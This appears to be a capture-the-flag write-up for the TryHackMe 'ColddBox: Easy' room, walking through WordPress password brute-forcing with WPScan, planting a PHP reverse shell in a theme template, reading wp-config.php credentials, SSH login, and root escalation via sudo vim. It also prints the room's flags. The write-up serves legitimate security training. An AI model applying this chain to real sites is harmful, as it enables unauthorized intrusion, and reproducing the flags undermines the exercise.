# ColdBox : Easy Walkthrough
### Link
- https://tryhackme.com/room/colddboxeasy
---
### Recon

```
nmap -sC -sV -p- [IP]
```
**Namp scan result**
```
Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-09 12:29 JST
Nmap scan report for 10.10.29.248
Host is up (0.38s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key information**: we have 2 ports --> **80** and **4512** 

Let's check the website and the source page and we have the confirmation : this website is based on WordPress

---
### Launch WPScan
```
sudo wpscan --url http://[IP]/ -e u -P ~/Documents/Tools/SecLists-master/rockyou.txt
```
**WPScan result**
```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.19
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.61.62/ [10.10.61.62]
[+] Started: Wed Nov  9 11:36:38 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.61.62/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.61.62/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.61.62/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.61.62/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.61.62/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.61.62/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.10.61.62/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://10.10.61.62/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.61.62/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:03 <===============================================> (10 / 10) 100.00% Time: 00:00:03

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 4 user/s
[SUCCESS] - c0ldd / 9876543210
^Cying the cold in person / dimples Time: 00:19:30 <                                                                                                               > (5624 / 57378791)  0.00%  ETA: ??:??:??
[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210
```

We just find valid credential ^^
**username: c0ldd** and **password: 9876543210**
---
### R4verse shell

- First: Log as **c0ldd** and navigate inside the dashboard.
- Second: Open Appearance --> Editor --> 404 Template (404.php)
- Third: Replace the content of this page by the reverse shell from [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Don't forget to change the information related to the attack machine and save.
- Fourth: Launch a listener in the attack machine
```

```
- Fifth: Load the page http://[IP]/wp-content/themes/twentyfifteen/404.php 

**Result** 
```
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 03:49:49 up 23 min,  0 users,  load average: 1.62, 1.04, 0.65
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ pwd
/
```

- Sixth: Improve the shell
```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

```
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@ColddBox-Easy:/$
```
---
### User Flag

```
www-data@ColddBox-Easy:/$ cd /home
cd /home
www-data@ColddBox-Easy:/home$ ls -l
ls -l
total 4
drwxr-xr-x 3 c0ldd c0ldd 4096 Oct 19  2020 c0ldd
www-data@ColddBox-Easy:/home$ cd c0ldd
cd c0ldd
www-data@ColddBox-Easy:/home/c0ldd$ ls -l
ls -l
total 4
-rw-rw---- 1 c0ldd c0ldd 53 Sep 24  2020 user.txt
www-data@ColddBox-Easy:/home/c0ldd$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

Ok, we cannot access directly to **user.txt** content. But we knwo the targeted machine uses WordPress. We can try to find information inside WordPress config files.

```
www-data@ColddBox-Easy:/var/www/html$ ls -l
ls -l
total 184
drwxr-xr-x  2 root     root      4096 Oct 19  2020 hidden
-rw-r--r--  1 www-data www-data   418 Sep 25  2013 index.php
-rw-r--r--  1 www-data www-data 19930 Sep 24  2020 license.txt
-rw-r--r--  1 www-data www-data  7173 Sep 24  2020 readme.html
-rw-r--r--  1 www-data www-data  6369 Sep 24  2020 wp-activate.php
drwxr-xr-x  9 www-data www-data  4096 Dec 18  2014 wp-admin
-rw-r--r--  1 www-data www-data   271 Jan  8  2012 wp-blog-header.php
-rw-r--r--  1 www-data www-data  5132 Sep 24  2020 wp-comments-post.php
-rw-r--r--  1 www-data www-data  2726 Sep  9  2014 wp-config-sample.php
-rw-rw-rw-  1 www-data www-data  3056 Oct 14  2020 wp-config.php
drwxr-xr-x  6 www-data www-data  4096 Oct 19  2020 wp-content
-rw-r--r--  1 www-data www-data  2956 May 13  2014 wp-cron.php
drwxr-xr-x 12 www-data www-data  4096 Dec 18  2014 wp-includes
-rw-r--r--  1 www-data www-data  2380 Oct 25  2013 wp-links-opml.php
-rw-r--r--  1 www-data www-data  2714 Jul  7  2014 wp-load.php
-rw-r--r--  1 www-data www-data 33455 Sep 24  2020 wp-login.php
-rw-r--r--  1 www-data www-data  8459 Sep 24  2020 wp-mail.php
-rw-r--r--  1 www-data www-data 11115 Jul 18  2014 wp-settings.php
-rw-r--r--  1 www-data www-data 25152 Nov 30  2014 wp-signup.php
-rw-r--r--  1 www-data www-data  4035 Nov 30  2014 wp-trackback.php
-rw-r--r--  1 www-data www-data  3032 Feb  9  2014 xmlrpc.php
```

After navigated inside some php file, we can find interesting information inside **wp-config.php**
```
www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'o[eR&,8+wPcLpZaE<ftDw!{,@U:p]_hc5L44E]Q/wgW,M==DB$dUdl_K1,XL/+4{');
define('SECURE_AUTH_KEY',  'utpu7}u9|FEi+3`RXVI+eam@@vV8c8x-ZdJ-e,mD<6L6FK)2GS }^:6[3*sN1f+2');
define('LOGGED_IN_KEY',    '9y<{{<I-m4$q-`4U5k|zUk/O}HX dPj~Q)<>#7yl+z#rU60L|Nm-&5uPPB(;^Za+');
define('NONCE_KEY',        'ZpGm$3g}3+qQU_i0E<MX_&;B_3-!Z=/:bqy$&[&7u^sjS!O:Yw;D.|$F9S4(&@M?');
define('AUTH_SALT',        'rk&S:6Wls0|nqYoCBEJls`FY(NhbeZ73&|1i&Zach?nbqCm|CgR0mmt&=gOjM[.|');
define('SECURE_AUTH_SALT', 'X:-ta$lAW|mQA+,)/0rW|3iuptU}v0fj[L^H6v|gFu}qHf4euH9|Y]:OnP|pC/~e');
define('LOGGED_IN_SALT',   'B9%hQAayJt:RVe+3yfx/H+:gF/#&.+`Q0c{y~xn?:a|sX5p(QV5si-,yBp|FEEPG');
define('NONCE_SALT',       '3/,|<&-`H)yC6U[oy{`9O7k)q4hj8x/)Qu_5D/JQ$-)r^~8l$CNTHz^i]HN-%w-g');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

define('WP_HOME', '/');
define('WP_SITEURL', '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
```

We have credentials to access through SSH to the machine: **username: c0ldd** and **password: cybersecurity**

---
### SSH access and user.txt 

```
ssh c0ldd@10.10.61.62 -p 4512
The authenticity of host '[10.10.61.62]:4512 ([10.10.61.62]:4512)' can't be established.
ED25519 key fingerprint is SHA256:4Burx9DOSmBG9A0+DFqpM7rY4cyqpq59iluJwKx690c.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.61.62]:4512' (ED25519) to the list of known hosts.
c0ldd@10.10.61.62's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


Pueden actualizarse 129 paquetes.
92 actualizaciones son de seguridad.
```

**Be careful : the port is 4512. Please refer to NMAP scan result**

```
c0ldd@ColddBox-Easy:~$ pwd
/home/c0ldd
c0ldd@ColddBox-Easy:~$ ls -l
total 4
-rw-rw---- 1 c0ldd c0ldd 53 Sep 24  2020 user.txt
c0ldd@ColddBox-Easy:~$ cat user.txt
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

**Question**
#### user.txt
**Answer** 
#### RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==

---
### Root.txt

Let's check what we can do with this user ^^

```
c0ldd@ColddBox-Easy:~$ sudo -l
[sudo] password for c0ldd:
Matching Defaults entries for c0ldd on ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User c0ldd may run the following commands on ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

We can run **vim**. 

Let's check [GTFOBINS](https://gtfobins.github.io/gtfobins/vim/#shell) and use the first pattern
```
vim -c ':!/bin/sh'
```

Let's go !!!

```
c0ldd@ColddBox-Easy:~$ sudo /usr/bin/vim

Execute the command :!/bin/sh

root@ColddBox-Easy:~# whoami
root
```

```
root@ColddBox-Easy:/root# ls -l
total 4
-rw-r--r-- 1 root root 49 Sep 24  2020 root.txt
root@ColddBox-Easy:/root# cat root.txt
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
``` 

**Question**
#### root.txt
**Answer** 
#### wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=